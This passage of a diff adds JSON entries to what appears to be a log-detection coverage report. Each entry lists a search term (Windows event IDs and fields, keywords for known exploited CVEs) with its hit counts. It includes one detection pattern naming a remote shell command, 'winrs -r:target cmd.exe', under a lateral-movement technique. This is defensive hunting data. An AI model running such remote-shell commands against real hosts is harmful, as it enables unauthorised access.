+      "subject": "T1021 WinRM",
+      "techniques": [
+        "T1021"
+      ],
+      "term": "winrs -r:target cmd.exe"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "logon (event 4624)",
+      "techniques": [],
+      "term": "AuthenticationPackage"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_access (event 10)",
+      "techniques": [],
+      "term": "CallTrace"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "CommandLine"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "Company"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "wmi_event (event 19)",
+      "techniques": [],
+      "term": "Consumer"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "file_create (event 11)",
+      "techniques": [],
+      "term": "CreationUtcTime"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "Description"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "logon (event 4624)",
+      "techniques": [],
+      "term": "DestinationAddress"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "network_connection (event 3)",
+      "techniques": [],
+      "term": "DestinationIp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "network_connection (event 3)",
+      "techniques": [],
+      "term": "DestinationPort"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "registry_event (event 13)",
+      "techniques": [],
+      "term": "Details"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "logon (event 4624)",
+      "techniques": [],
+      "term": "EventID"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "FileVersion"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_access (event 10)",
+      "techniques": [],
+      "term": "GrantedAccess"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "Hashes"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "Image"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "IntegrityLevel"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "kerberos_ticket (event 4768)",
+      "techniques": [],
+      "term": "IpAddress"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "logon (event 4624)",
+      "techniques": [],
+      "term": "LogonProcess"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "logon (event 4624)",
+      "techniques": [],
+      "term": "LogonType"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "wmi_event (event 19)",
+      "techniques": [],
+      "term": "Name"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "wmi_event (event 19)",
+      "techniques": [],
+      "term": "Namespace"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "OriginalFileName"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "ParentCommandLine"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "ParentImage"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "powershell_script (event 4104)",
+      "techniques": [],
+      "term": "Path"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "ProcessGuid"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "ProcessId"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "network_connection (event 3)",
+      "techniques": [],
+      "term": "ProcessName"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "Product"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "network_connection (event 3)",
+      "techniques": [],
+      "term": "Protocol"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "wmi_event (event 19)",
+      "techniques": [],
+      "term": "Query"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "dns_query (event 22)",
+      "techniques": [],
+      "term": "QueryName"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "dns_query (event 22)",
+      "techniques": [],
+      "term": "QueryResult"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "dns_query (event 22)",
+      "techniques": [],
+      "term": "QueryType"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "powershell_script (event 4104)",
+      "techniques": [],
+      "term": "ScriptBlockId"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "powershell_script (event 4104)",
+      "techniques": [],
+      "term": "ScriptBlockText"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "powershell_script (event 4104)",
+      "techniques": [],
+      "term": "SequenceNumber"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "service_create (event 7045)",
+      "techniques": [],
+      "term": "ServiceAccount"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "service_create (event 7045)",
+      "techniques": [],
+      "term": "ServiceFileName"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "service_create (event 7045)",
+      "techniques": [],
+      "term": "ServiceName"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "service_create (event 7045)",
+      "techniques": [],
+      "term": "ServiceStartType"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "service_create (event 7045)",
+      "techniques": [],
+      "term": "ServiceType"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "smb_access (event 5140)",
+      "techniques": [],
+      "term": "ShareName"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "logon (event 4624)",
+      "techniques": [],
+      "term": "SourceAddress"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_access (event 10)",
+      "techniques": [],
+      "term": "SourceImage"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "network_connection (event 3)",
+      "techniques": [],
+      "term": "SourceIp"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "network_connection (event 3)",
+      "techniques": [],
+      "term": "SourcePort"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "logon (event 4624)",
+      "techniques": [],
+      "term": "Status"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "file_create (event 11)",
+      "techniques": [],
+      "term": "TargetFilename"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "process_access (event 10)",
+      "techniques": [],
+      "term": "TargetImage"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "registry_event (event 13)",
+      "techniques": [],
+      "term": "TargetObject"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "kerberos_ticket (event 4768)",
+      "techniques": [],
+      "term": "TargetUserName"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "scheduled_task (event 4698)",
+      "techniques": [],
+      "term": "TaskContent"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "scheduled_task (event 4698)",
+      "techniques": [],
+      "term": "TaskName"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "kerberos_ticket (event 4768)",
+      "techniques": [],
+      "term": "TicketEncryptionType"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "kerberos_ticket (event 4768)",
+      "techniques": [],
+      "term": "TicketOptions"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_field",
+      "subject": "registry_event (event 13)",
+      "techniques": [],
+      "term": "ValueName"
+    },
+    {
+      "events_hit": 13061,
+      "file_rate": 0.2895,
+      "files_hit": 297,
+      "kind": "event_id",
+      "subject": "process_create (event 1)",
+      "techniques": [],
+      "term": "1"
+    },
+    {
+      "events_hit": 3387,
+      "file_rate": 0.2242,
+      "files_hit": 230,
+      "kind": "event_id",
+      "subject": "process_access (event 10)",
+      "techniques": [],
+      "term": "10"
+    },
+    {
+      "events_hit": 1793,
+      "file_rate": 0.2173,
+      "files_hit": 223,
+      "kind": "event_id",
+      "subject": "file_create (event 11)",
+      "techniques": [],
+      "term": "11"
+    },
+    {
+      "events_hit": 1093,
+      "file_rate": 0.2096,
+      "files_hit": 215,
+      "kind": "event_id",
+      "subject": "registry_event (event 13)",
+      "techniques": [],
+      "term": "13"
+    },
+    {
+      "events_hit": 615,
+      "file_rate": 0.1901,
+      "files_hit": 195,
+      "kind": "event_id",
+      "subject": "wmi_event (event 19)",
+      "techniques": [],
+      "term": "19"
+    },
+    {
+      "events_hit": 329,
+      "file_rate": 0.1793,
+      "files_hit": 184,
+      "kind": "event_id",
+      "subject": "dns_query (event 22)",
+      "techniques": [],
+      "term": "22"
+    },
+    {
+      "events_hit": 242,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "event_id",
+      "subject": "powershell_script (event 4104)",
+      "techniques": [],
+      "term": "4104"
+    },
+    {
+      "events_hit": 316,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "event_id",
+      "subject": "logon (event 4624)",
+      "techniques": [],
+      "term": "4624"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_id",
+      "subject": "scheduled_task (event 4698)",
+      "techniques": [],
+      "term": "4698"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_id",
+      "subject": "kerberos_ticket (event 4768)",
+      "techniques": [],
+      "term": "4768"
+    },
+    {
+      "events_hit": 7987,
+      "file_rate": 0.2602,
+      "files_hit": 267,
+      "kind": "event_id",
+      "subject": "process_terminate (event 5)",
+      "techniques": [],
+      "term": "5"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "event_id",
+      "subject": "smb_access (event 5140)",
+      "techniques": [],
+      "term": "5140"
+    },
+    {
+      "events_hit": 24,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "event_id",
+      "subject": "service_create (event 7045)",
+      "techniques": [],
+      "term": "7045"
+    },
+    {
+      "events_hit": 10,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36025 Windows SmartScreen Bypass",
+      "techniques": [],
+      "term": ".url"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4863 Chrome WebP Heap Buffer Overflow",
+      "techniques": [],
+      "term": "0day"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21338 Windows Kernel Privilege Escalation",
+      "techniques": [],
+      "term": "0x80070005"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21338 Windows Kernel Privilege Escalation",
+      "techniques": [],
+      "term": "access denied"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-22518 Confluence Improper Authorization",
+      "techniques": [],
+      "term": "atlassian"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-27198 JetBrains TeamCity Authentication Bypass",
+      "techniques": [],
+      "term": "authentication bypass"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36052 Azure CLI REST Command Vulnerability",
+      "techniques": [],
+      "term": "az rest"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36052 Azure CLI REST Command Vulnerability",
+      "techniques": [],
+      "term": "azure cli"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4863 Chrome WebP Heap Buffer Overflow",
+      "techniques": [],
+      "term": "browser exploit"
+    },
+    {
+      "events_hit": 6,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21412 Windows SmartScreen Bypass",
+      "techniques": [],
+      "term": "bypass"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-29895 Cacti Command Injection",
+      "techniques": [],
+      "term": "cacti"
+    },
+    {
+      "events_hit": 35,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4863 Chrome WebP Heap Buffer Overflow",
+      "techniques": [],
+      "term": "chrome"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4966 Citrix Bleed",
+      "techniques": [],
+      "term": "citrix"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4966 Citrix Bleed",
+      "techniques": [],
+      "term": "citrix bleed"
+    },
+    {
+      "events_hit": 21,
+      "file_rate": 0.0029,
+      "files_hit": 3,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36036 Windows Cloud Files Mini Filter Driver",
+      "techniques": [],
+      "term": "cldflt"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36036 Windows Cloud Files Mini Filter Driver",
+      "techniques": [],
+      "term": "cloud files"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-3400 Palo Alto PAN-OS Command Injection",
+      "techniques": [],
+      "term": "command injection"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-22518 Confluence Improper Authorization",
+      "techniques": [],
+      "term": "confluence"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21887 Ivanti Connect Secure Command Injection",
+      "techniques": [],
+      "term": "connect secure"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21626 RunC Container Escape",
+      "techniques": [],
+      "term": "container breakout"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21626 RunC Container Escape",
+      "techniques": [],
+      "term": "container escape"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-3400 Palo Alto PAN-OS Command Injection",
+      "techniques": [],
+      "term": "device telemetry"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21626 RunC Container Escape",
+      "techniques": [],
+      "term": "docker"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23397 Microsoft Outlook Elevation of Privilege",
+      "techniques": [],
+      "term": "elevation of privilege"
+    },
+    {
+      "events_hit": 106,
+      "file_rate": 0.0292,
+      "files_hit": 30,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23397 Microsoft Outlook Elevation of Privilege",
+      "techniques": [],
+      "term": "eop"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-29824 Ivanti EPMM SQL Injection",
+      "techniques": [],
+      "term": "epmm"
+    },
+    {
+      "events_hit": 34,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36874 Windows Error Reporting Service",
+      "techniques": [],
+      "term": "error reporting"
+    },
+    {
+      "events_hit": 33,
+      "file_rate": 0.0049,
+      "files_hit": 5,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36745 Microsoft Exchange Server Remote Code Execution",
+      "techniques": [],
+      "term": "ews"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23396 Microsoft Excel Remote Code Execution",
+      "techniques": [],
+      "term": "excel"
+    },
+    {
+      "events_hit": 12,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36745 Microsoft Exchange Server Remote Code Execution",
+      "techniques": [],
+      "term": "exchange"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-27997 FortiOS SSL VPN Heap Overflow",
+      "techniques": [],
+      "term": "fortigate"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21762 Fortinet FortiOS Out-of-Bounds Write",
+      "techniques": [],
+      "term": "fortinet"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21762 Fortinet FortiOS Out-of-Bounds Write",
+      "techniques": [],
+      "term": "fortios"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-3400 Palo Alto PAN-OS Command Injection",
+      "techniques": [],
+      "term": "GlobalProtect"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4863 Chrome WebP Heap Buffer Overflow",
+      "techniques": [],
+      "term": "heap buffer overflow"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-27997 FortiOS SSL VPN Heap Overflow",
+      "techniques": [],
+      "term": "heap overflow"
+    },
+    {
+      "events_hit": 20,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36884 Microsoft Office Remote Code Execution",
+      "techniques": [],
+      "term": "html"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-22518 Confluence Improper Authorization",
+      "techniques": [],
+      "term": "improper authorization"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36025 Windows SmartScreen Bypass",
+      "techniques": [],
+      "term": "internet shortcut"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-29824 Ivanti EPMM SQL Injection",
+      "techniques": [],
+      "term": "ivanti"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-27198 JetBrains TeamCity Authentication Bypass",
+      "techniques": [],
+      "term": "jetbrains"
+    },
+    {
+      "events_hit": 2043,
+      "file_rate": 0.0283,
+      "files_hit": 29,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21338 Windows Kernel Privilege Escalation",
+      "techniques": [],
+      "term": "kernel"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21626 RunC Container Escape",
+      "techniques": [],
+      "term": "kubernetes"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23396 Microsoft Excel Remote Code Execution",
+      "techniques": [],
+      "term": "macro"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21412 Windows SmartScreen Bypass",
+      "techniques": [],
+      "term": "mark-of-the-web"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4966 Citrix Bleed",
+      "techniques": [],
+      "term": "memory disclosure"
+    },
+    {
+      "events_hit": 3,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36884 Microsoft Office Remote Code Execution",
+      "techniques": [],
+      "term": "mhtml"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23396 Microsoft Excel Remote Code Execution",
+      "techniques": [],
+      "term": "microsoft excel"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36745 Microsoft Exchange Server Remote Code Execution",
+      "techniques": [],
+      "term": "microsoft exchange"
+    },
+    {
+      "events_hit": 1,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36884 Microsoft Office Remote Code Execution",
+      "techniques": [],
+      "term": "microsoft office"
+    },
+    {
+      "events_hit": 1,
+      "file_rate": 0.001,
+      "files_hit": 1,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23397 Microsoft Outlook Elevation of Privilege",
+      "techniques": [],
+      "term": "microsoft outlook"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36036 Windows Cloud Files Mini Filter Driver",
+      "techniques": [],
+      "term": "mini filter"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21412 Windows SmartScreen Bypass",
+      "techniques": [],
+      "term": "motw"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23397 Microsoft Outlook Elevation of Privilege",
+      "techniques": [],
+      "term": "net-ntlm"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23397 Microsoft Outlook Elevation of Privilege",
+      "techniques": [],
+      "term": "net-ntlmv2"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-4966 Citrix Bleed",
+      "techniques": [],
+      "term": "netscaler"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-21746 Windows NTLM Elevation of Privilege",
+      "techniques": [],
+      "term": "ntlm"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-21746 Windows NTLM Elevation of Privilege",
+      "techniques": [],
+      "term": "ntlm relay"
+    },
+    {
+      "events_hit": 73,
+      "file_rate": 0.0136,
+      "files_hit": 14,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36884 Microsoft Office Remote Code Execution",
+      "techniques": [],
+      "term": "office"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21762 Fortinet FortiOS Out-of-Bounds Write",
+      "techniques": [],
+      "term": "out-of-bounds write"
+    },
+    {
+      "events_hit": 11,
+      "file_rate": 0.0019,
+      "files_hit": 2,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-23397 Microsoft Outlook Elevation of Privilege",
+      "techniques": [],
+      "term": "outlook"
+    },
+    {
+      "events_hit": 4,
+      "file_rate": 0.0039,
+      "files_hit": 4,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36745 Microsoft Exchange Server Remote Code Execution",
+      "techniques": [],
+      "term": "owa"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-29895 Cacti Command Injection",
+      "techniques": [],
+      "term": "package import"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-3400 Palo Alto PAN-OS Command Injection",
+      "techniques": [],
+      "term": "PAN-OS"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2024-21888 Ivanti Connect Secure Privilege Escalation",
+      "techniques": [],
+      "term": "privilege escalation"
+    },
+    {
+      "events_hit": 778,
+      "file_rate": 0.038,
+      "files_hit": 39,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36884 Microsoft Office Remote Code Execution",
+      "techniques": [],
+      "term": "rce"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36884 Microsoft Office Remote Code Execution",
+      "techniques": [],
+      "term": "remote code execution"
+    },
+    {
+      "events_hit": 0,
+      "file_rate": 0.0,
+      "files_hit": 0,
+      "kind": "kev_needle",
+      "subject": "CVE-2023-36052 Azure CLI REST Command Vulnerability",
